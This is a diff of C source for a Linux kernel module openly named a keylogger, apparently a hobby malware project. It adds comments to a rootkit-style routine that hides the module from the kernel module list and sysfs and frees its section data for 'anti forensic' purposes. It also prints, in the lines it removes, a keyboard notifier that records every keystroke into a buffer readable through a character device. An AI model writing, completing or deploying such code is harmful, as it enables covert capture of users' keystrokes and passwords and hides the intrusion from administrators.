@@ -19,35 +19,38 @@
 #include "keys.h"
 #define BUFF_SIZE (PAGE_SIZE << 2)
 #define DEVICE_NAME "Keylogger"
+
+
+/*Vars for keystroke & strings save*/
 static char msg_Ptr[BUFF_SIZE];
 static size_t buf_pos;
-int is_hide = 0;
+
+/*Vars for the charcater devices*/
+struct cdev *mcdev;
+struct cdev *mcdev1;
+int major_number;
+dev_t dev_num;
+dev_t dev_num1;
 struct fake_device
 {
     char data[100];
     struct semaphore sem;
     
-} virtual_device, virtual_device1;
+};
+struct fake_device virtual_device, virtual_device1;
 
-struct cdev *mcdev;
-struct cdev *mcdev1;
-int major_number;
+/*ret value and hide value*/
 int ret;
-dev_t dev_num;
-dev_t dev_num1;
+int is_hide = 0;
 
-/*void hide(void)
-{
-    list_del(&THIS_MODULE->list);
-    is_hide =1;
-}
-void unhide(void)
-{
-    list_add(&THIS_MODULE->list, module_list);
-    is_hide=0;
-}*/
+
+
+/*define the syfs_remove_dir func*/
 void (*sysfs_remove_fir_orig)(struct kobject *);
 
+
+/*file opersion for hideing and unhide the module*/
+/*works by using the open file opersion*/
 int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
     static struct list_head *module_list;
@@ -55,12 +58,12 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
     sysfs_remove_fir_orig = (void *)module_kallsyms_lookup_name("sysfs_remove_dir");
     if (!is_hide)
     {
-
+        /*wait to get mutex*/
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
         module_list = THIS_MODULE->list.prev;
         saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
-        list_del_init(&THIS_MODULE->list);
+        list_del_init(&THIS_MODULE->list);//remove form the modules linked list
         sysfs_remove_dir(&THIS_MODULE->mkobj.kobj);//remove the specific dir (not the object from the module)
         kfree(THIS_MODULE->sect_attrs);/*clean informasion for anti forensic*/
         kfree(THIS_MODULE->notes_attrs);/*using kfree to clean*/
@@ -75,8 +78,8 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
         list_add(&THIS_MODULE->list, module_list);
-        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");
-        kobject_put(&THIS_MODULE->mkobj.kobj);
+        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");//need to fix
+        kobject_put(&THIS_MODULE->mkobj.kobj);// need to fix
         is_hide=0;
         
         mutex_unlock(&module_mutex);
@@ -85,6 +88,9 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
     
     return 0;    
 }
+
+
+/*fops for keyloging charcter device*/
 int device_open(struct inode *inode, struct file * filp)
 {
     //using mutex for allow only open process to use
@@ -96,11 +102,6 @@ int device_open(struct inode *inode, struct file * filp)
     printk(KERN_INFO "Keylogger: opend device");
     return 0;
 }
-static struct file_operations fops_hide =
-{
-    .owner = THIS_MODULE,
-    .open = dev_open_fops_for_hide
-};
 
 ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
 {
@@ -116,21 +117,12 @@ int device_close(struct inode *inode, struct file *flip)
     return 0;
 } 
 static ssize_t device_read(struct file *filp, char __user * buffer, size_t length, loff_t *offset)
-{
-    /*
-    int bytes_read=0;
-    if (*msg_Ptr ==0) return 0;
-    while (length && *msg_Ptr){
-        put_user(*(msg_Ptr++), buffer++);
-        length--;
-        bytes_read++;
-    }
-    printk(KERN_ALERT "Keylogger: dvice read execute");
-    return bytes_read;*/
-    printk(KERN_ALERT "Keylogger: dvice read execute");
-    
+{    
     return simple_read_from_buffer(buffer, length, offset, msg_Ptr, buf_pos);
 }
+/*################*/
+
+//fops for the charcter devices
 static struct file_operations fops =
 {
     .owner = THIS_MODULE, 
@@ -139,6 +131,16 @@ static struct file_operations fops =
     .release = device_close,
     .open = device_open
 };
+static struct file_operations fops_hide =
+{
+    .owner = THIS_MODULE,
+    .open = dev_open_fops_for_hide
+};
+//#########
+
+
+
+//load the hide charcter device
 static int hide_driver_entery(void)
 {
     ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
@@ -159,9 +161,8 @@ static int hide_driver_entery(void)
     }
     sema_init(&virtual_device1.sem, 1);
     return 0;
-
-
 }
+//load the charcter device for keyloging
 static int driver_entry(void)
 {
     ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
@@ -186,6 +187,9 @@ static int driver_entry(void)
     return 0;
 
 }
+
+//unload the charcter device for keyloging
+
 static void driver_exit(void)
 {
     cdev_del(mcdev);
@@ -195,46 +199,4 @@ static void driver_exit(void)
 }
 
 
-int len;
-
-int keycode_to_string(int key_press, int shift, char* buff)
-{
-
-    char* tav;  
-    if (shift)
-    {
-        /*hundle as shift*/
-        tav = keycode[key_press][1];
-    }
-    else
-    {
-        tav = keycode[key_press][0];
-    }
-        len = sprintf(buff,tav);
-        return len;    
-    
-}
-int notifier(struct notifier_block *block, unsigned long code, void *p)
-{
-    struct keyboard_notifier_param *param =(struct keyboard_notifier_param*) p;
-    char keybuffer[12] = {0};
-
-    if (!(param->down))
-        return NOTIFY_OK;
-
-    if (code == KBD_KEYCODE)
-    {
-        len = keycode_to_string(param->value, param->shift, keybuffer) ;  
-        if (strlen(keybuffer)> 0 && len)
-        {
-            printk(KERN_ALERT "notifer type to msg ptr");
-            strncpy(msg_Ptr+ buf_pos, keybuffer, len);
-            buf_pos+=len;
-            
-                    
-        }
-
-    }
-    return NOTIFY_OK;
-}
 #endif
